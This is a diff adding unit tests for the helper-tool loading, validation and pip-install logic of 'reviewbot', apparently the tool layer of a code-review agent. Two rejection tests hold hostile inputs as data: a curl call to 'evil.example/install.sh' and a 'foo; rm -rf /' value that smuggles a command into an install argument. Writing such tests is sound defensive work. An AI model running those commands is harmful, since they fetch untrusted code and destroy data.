@@ -7,13 +7,19 @@ from unittest.mock import Mock, patch
 
 import requests
 
+from reviewbot import tools as tools_mod
 from reviewbot.tools import (
     ALLOWED_FETCH_HOSTS,
     DENY_DIR_NAMES,
     MAX_FETCH_BODY_CHARS,
     MAX_READ_LINES,
     MAX_TOOL_OUTPUT_CHARS,
+    HelperInstallResult,
+    RepoHelperTool,
     ToolEnv,
+    build_tool_specs,
+    install_helper_tools,
+    load_repo_helper_tools,
     run_tool,
 )
 
@@ -35,6 +41,17 @@ class _TempRepo(unittest.TestCase):
             f.write("CONSTANT = 1\n")
         with open(os.path.join(self.repo_root, "README.md"), "w") as f:
             f.write("# fixture repo\n")
+        os.makedirs(os.path.join(self.repo_root, "tools"))
+        with open(os.path.join(self.repo_root, "tools", "helper.sh"), "w") as f:
+            f.write(
+                "#!/bin/sh\n"
+                "printf 'cwd=%s\\n' \"$(pwd)\"\n"
+                "printf 'argc=%s\\n' \"$#\"\n"
+                "for arg in \"$@\"; do\n"
+                "  printf 'arg=%s\\n' \"$arg\"\n"
+                "done\n"
+            )
+        os.chmod(os.path.join(self.repo_root, "tools", "helper.sh"), 0o755)
         # Pretend there's a .git dir so the denylist has something to bite on
         os.makedirs(os.path.join(self.repo_root, ".git", "refs"))
         # Real git init so `git grep` works in the grep tests
@@ -135,6 +152,246 @@ class ResolvePathTests(_TempRepo):
             f.write("x" * (MAX_TOOL_OUTPUT_CHARS * 2))
         out = run_tool(self.env, "read_file", {"path": "huge.txt"})
         self.assertIn("[... truncated", out)
+
+    def test_build_tool_specs_appends_repo_helpers(self) -> None:
+        env = ToolEnv(
+            repo_root=self.repo_root,
+            helper_tools={
+                "fixture_helper": RepoHelperTool(
+                    name="fixture_helper",
+                    description="Run the fixture helper script.",
+                    command=("./tools/helper.sh",),
+                    allow_args=True,
+                    max_args=2,
+                )
+            },
+        )
+
+        specs = build_tool_specs(env)
+
+        helper_spec = next(
+            spec for spec in specs if spec["function"]["name"] == "fixture_helper"
+        )
+        self.assertEqual(
+            helper_spec["function"]["description"],
+            "Run the fixture helper script.",
+        )
+        self.assertIn("args", helper_spec["function"]["parameters"]["properties"])
+
+    def test_repo_helper_runs_repo_relative_command(self) -> None:
+        env = ToolEnv(
+            repo_root=self.repo_root,
+            helper_tools={
+                "fixture_helper": RepoHelperTool(
+                    name="fixture_helper",
+                    description="Run the fixture helper script.",
+                    command=("./tools/helper.sh",),
+                    allow_args=True,
+                    max_args=2,
+                )
+            },
+        )
+
+        out = run_tool(env, "fixture_helper", {"args": ["alpha", "beta"]})
+
+        self.assertIn("exit_code: 0", out)
+        self.assertIn("argc=2", out)
+        self.assertIn("arg=alpha", out)
+        self.assertIn("arg=beta", out)
+
+    def test_repo_helper_rejects_args_when_not_allowed(self) -> None:
+        env = ToolEnv(
+            repo_root=self.repo_root,
+            helper_tools={
+                "fixture_helper": RepoHelperTool(
+                    name="fixture_helper",
+                    description="Run the fixture helper script.",
+                    command=("./tools/helper.sh",),
+                )
+            },
+        )
+
+        out = run_tool(env, "fixture_helper", {"args": ["alpha"]})
+
+        self.assertTrue(out.startswith("error:"), out)
+        self.assertIn("does not accept additional args", out)
+
+
+class RepoHelperConfigTests(unittest.TestCase):
+    def test_load_repo_helper_tools_parses_valid_config(self) -> None:
+        helpers = load_repo_helper_tools(
+            """
+            {
+              "helpers": [
+                {
+                  "name": "mlinter",
+                  "description": "Run the model linter.",
+                  "command": ["mlinter"],
+                  "allow_args": true,
+                  "max_args": 4,
+                  "timeout_seconds": 30
+                }
+              ]
+            }
+            """
+        )
+
+        self.assertEqual(len(helpers), 1)
+        self.assertEqual(helpers[0].name, "mlinter")
+        self.assertEqual(helpers[0].command, ("mlinter",))
+        self.assertTrue(helpers[0].allow_args)
+        self.assertEqual(helpers[0].max_args, 4)
+
+    def test_load_repo_helper_tools_rejects_builtin_name_conflict(self) -> None:
+        with self.assertRaises(ValueError) as ctx:
+            load_repo_helper_tools(
+                """
+                {"helpers": [{"name": "grep", "description": "bad", "command": ["x"]}]}
+                """
+            )
+        self.assertIn("conflicts with a built-in tool", str(ctx.exception))
+
+    def test_load_repo_helper_tools_parses_install_spec(self) -> None:
+        helpers = load_repo_helper_tools(
+            """
+            {
+              "helpers": [
+                {
+                  "name": "mlinter",
+                  "description": "Run the model linter.",
+                  "command": ["mlinter"],
+                  "install": ["pip", "install", "transformers-mlinter"]
+                }
+              ]
+            }
+            """
+        )
+        self.assertEqual(
+            helpers[0].install, ("pip", "install", "transformers-mlinter")
+        )
+
+    def test_load_repo_helper_tools_rejects_unknown_installer(self) -> None:
+        with self.assertRaises(ValueError) as ctx:
+            load_repo_helper_tools(
+                """
+                {"helpers": [{
+                  "name": "mlinter",
+                  "description": "x",
+                  "command": ["mlinter"],
+                  "install": ["curl", "https://evil.example/install.sh"]
+                }]}
+                """
+            )
+        self.assertIn("install command must start with", str(ctx.exception))
+
+    def test_load_repo_helper_tools_rejects_empty_install(self) -> None:
+        with self.assertRaises(ValueError) as ctx:
+            load_repo_helper_tools(
+                """
+                {"helpers": [{
+                  "name": "mlinter",
+                  "description": "x",
+                  "command": ["mlinter"],
+                  "install": []
+                }]}
+                """
+            )
+        self.assertIn("non-empty array", str(ctx.exception))
+
+    def test_load_repo_helper_tools_rejects_install_arg_with_shell_meta(self) -> None:
+        # `;` would be a problem if anyone ever shelled out — reject up front
+        # so the config can't smuggle shell metacharacters into installer args.
+        with self.assertRaises(ValueError) as ctx:
+            load_repo_helper_tools(
+                """
+                {"helpers": [{
+                  "name": "mlinter",
+                  "description": "x",
+                  "command": ["mlinter"],
+                  "install": ["pip", "install", "foo; rm -rf /"]
+                }]}
+                """
+            )
+        self.assertIn("disallowed characters", str(ctx.exception))
+
+
+class InstallHelperToolsTests(unittest.TestCase):
+    def setUp(self) -> None:
+        # Reset the process-local cache so each test is independent.
+        tools_mod._INSTALL_CACHE.clear()
+
+    def _helper(self) -> RepoHelperTool:
+        return RepoHelperTool(
+            name="mlinter",
+            description="Model linter.",
+            command=("mlinter",),
+            install=("pip", "install", "transformers-mlinter"),
+        )
+
+    def test_skips_helpers_without_install(self) -> None:
+        helper = RepoHelperTool(
+            name="plain",
+            description="x",
+            command=("plain",),
+        )
+        with patch("reviewbot.tools.subprocess.run") as mock_run:
+            results = install_helper_tools([helper])
+        self.assertEqual(results, [])
+        mock_run.assert_not_called()
+
+    def test_runs_pip_via_python_module(self) -> None:
+        helper = self._helper()
+        mock_proc = Mock(returncode=0, stdout="ok", stderr="")
+        with patch(
+            "reviewbot.tools.subprocess.run", return_value=mock_proc
+        ) as mock_run:
+            results = install_helper_tools([helper])
+        self.assertEqual(len(results), 1)
+        self.assertTrue(results[0].ok, results[0].message)
+        cmd = mock_run.call_args.args[0]
+        # Run via `python -m pip` so the install lands in this interpreter.
+        self.assertEqual(cmd[1:], ["-m", "pip", "install", "transformers-mlinter"])
+
+    def test_caches_successful_install(self) -> None:
+        helper = self._helper()
+        mock_proc = Mock(returncode=0, stdout="", stderr="")
+        with patch(
+            "reviewbot.tools.subprocess.run", return_value=mock_proc
+        ) as mock_run:
+            install_helper_tools([helper])
+            results = install_helper_tools([helper])
+        # Second call should hit the cache, not subprocess.
+        self.assertEqual(mock_run.call_count, 1)
+        self.assertTrue(results[0].ok)
+        self.assertIn("cached", results[0].message)
+
+    def test_failed_install_is_not_cached(self) -> None:
+        helper = self._helper()
+        mock_proc = Mock(returncode=1, stdout="", stderr="pkg not found")
+        with patch(
+            "reviewbot.tools.subprocess.run", return_value=mock_proc
+        ) as mock_run:
+            r1 = install_helper_tools([helper])
+            r2 = install_helper_tools([helper])
+        self.assertEqual(mock_run.call_count, 2)
+        self.assertFalse(r1[0].ok)
+        self.assertFalse(r2[0].ok)
+        self.assertIn("pkg not found", r1[0].message)
+
+    def test_install_timeout_is_reported(self) -> None:
+        helper = self._helper()
+        with patch(
+            "reviewbot.tools.subprocess.run",
+            side_effect=subprocess.TimeoutExpired(cmd="pip", timeout=1),
+        ):
+            results = install_helper_tools([helper])
+        self.assertFalse(results[0].ok)
+        self.assertIn("timed out", results[0].message)
+
+    def test_result_dataclass_shape(self) -> None:
+        # Sanity: callers depend on .name / .ok / .message.
+        r = HelperInstallResult(name="x", ok=True, message="m")
+        self.assertEqual((r.name, r.ok, r.message), ("x", True, "m"))
 
 
 class FetchUrlTests(unittest.TestCase):
